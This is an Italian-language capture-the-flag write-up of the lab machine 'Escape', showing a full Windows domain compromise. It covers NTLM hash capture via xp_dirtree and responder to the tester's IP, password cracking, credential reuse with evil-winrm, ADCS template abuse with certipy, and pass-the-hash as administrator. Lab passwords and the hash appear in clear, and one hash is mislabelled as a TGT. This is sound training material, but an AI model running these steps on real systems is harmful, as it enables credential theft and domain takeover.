# Escape

## Reconnaissance

Per prima cosa eseguo una scansione completa con _nmapAutomator_.

```bash
sudo nmapAutomator.sh --host 10.10.11.202 --type All
```

Il risultato della scansione è il seguente:

```text
Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl


---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-11 21:35:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-11T21:36:21+00:00; +8h11m27s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2024-01-11T21:18:58
|_Not valid after:  2025-01-10T21:18:58
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-11T21:36:20+00:00; +8h11m27s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2024-01-11T21:18:58
|_Not valid after:  2025-01-10T21:18:58
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-11T21:36:21+00:00; +8h11m27s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2024-01-11T21:18:58
|_Not valid after:  2025-01-10T21:18:58
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2024-01-11T21:18:58
|_Not valid after:  2025-01-10T21:18:58
|_ssl-date: 2024-01-11T21:36:20+00:00; +8h11m27s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-01-11T21:35:42
|_  start_date: N/A
|_clock-skew: mean: 8h11m26s, deviation: 0s, median: 8h11m26s


----------------------Starting UDP Scan------------------------

PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap

```

Dall'output è possibile pensare che sia attiva una CA (Certificate Authority), data la presenza di numerosi riferimenti ai certificati. Questa è un informazione interessante che potrebbe tornare utile successivamente.

Modifico il file _/etc/hosts_ nel seguente modo:

```bash
echo "10.10.11.202 sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

## Enumeration
Parto da SMB:


```bash
smbclient -L 10.10.11.202
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-1.png"/>
</p>

Provo a vedere cosa c'è nello share Public:

```bash
smbclient -L //10.10.11.202/Public -N
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-2.png"/>
</p>

Quindi scarico il pdf e lo visualizzo:

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-4.png"/>
</p>

All'interno sono presenti delle credenziali per accedere all'istanza MSSQL.

Procedo utilizzando lo _sqsh_ per eseguire il login:

```bash
sqsh -S 10.10.11.202 -U PublicUser -P GuestUserCantWrite1
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-5.png"/>
</p>

## Foothold

Putroppo non trovo nulla di interessante all'interno. Inoltre non riesco ad ottenre una shell in quanto non ho i permessi per utilizzare _xp_cmdshell_.

Provo quindi a forzare il servizio SQL ad autenticarsi alla mia macchina per catturare l'hash.

Avvio quindi _responder_:

```bash
responder -I tun0 -v
```

E dal server lancio il seguente comando:

```SQL
EXEC MASTER.sys.xp_dirtree '\\10.10.14.8\prova', 1, 1
```

In questo modo ottengo l'hash dell'utente _sql_svc_:

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-6.png"/>
</p>

Salvo l'hash appena scoperto nel file _hash.txt_ e utilizzo _johntheripper_ per cercare di ricavare la passwoard:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-7.png"/>
</p>

**Ottengo così la password dell'utente _sql_svc_!**

Ora, tramite _evil-winrm_, provo ad autenticarmi:

```bash
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```
<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-8.png"/>
</p>

## Lateral Movement
Putroppo non trovo il primo flag.

Cerco quindi la presenza di altri utenti nel sistema:

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-9.png"/>
</p>

L'utente _Rayan.Cooper_ potrebbe essere il possessore del primo flag.

Per ottenere maggiorni informazioni sul sistema trasferisco ed eseguo _winPEASx64.exe_. Ma non ne viene fuori nulla di interessante.

Cercando sulla macchina trovo il file _ERRORLOG.BAK_. Al suo interno c'è un tentativo fallito di accesso da parte dell'utente _Rayan.Cooper_ e la password utilizzata:

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-10.png"/>
</p>

Provo quindi ad autenticarmi sfruttando l'informazione appena ottenuta:

```bash
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-11.png"/>
</p>

**Ottengo così il primo flag!**

## Privilege Escalation
Ora devo trovare un modo per elevare i miei privilegi.

Provo ad utilizzare _Certify_ per ricercare errori di configurazione nei _Active Directory Certificate Services_.


Scarico la versione precompilata di _Certify_ da [qui](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) e la trasferisco sulla macchina vittima.

Successivamente, lancio il seguente comando:

```bash
Certify.exe find /vulnerable
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-12.png"/>
</p>

Quindi scopro che la macchina è vulnerabile al template "UserAuthentication". In particolare, se il flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT viene trovato nell'attributo mspki-certificate-name-flag, gli utenti iscritti al certificato possono fornire un Subject Name alternativo quando richiedono il certificato.

Quindi questo permette a chiunque di iscriversi a questo template fornendo un nome alternativo (e quindi anche quello del Domani Administrator).

Per sfruttare questa vulnerabilità utilizzo _certipy_:

```bash
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb
-target sequel.htb -ca sequel-dc-ca -template UserAuthentication
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-13.png"/>
</p>

Una volta ottenuto il certificato utilizzo _certipy_ per recuperare il TGT dell'utente administrator:

```bash
certipy auth -pfx administrator.pfx
```

Ma ottengo il seguente errore:

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-14.png"/>
</p>

Per risolvere devo sincronizzare il clock della mia macchina con quello della macchina remota:

```bash
sudo ntpdate -u dc.sequel.htb
```

Successivamente, lancio di nuovo comando _certipy_ e ottengo cosi il TGT dell'administrator:

```text
a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Utilizzo evil-winrm per autenticarmi come administrator:

```bash
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

<p align="center">
  <img src="/Immagini/Windows-Box/Escape/escape-15.png"/>
</p>

**Ottengo così il secondo flag!**
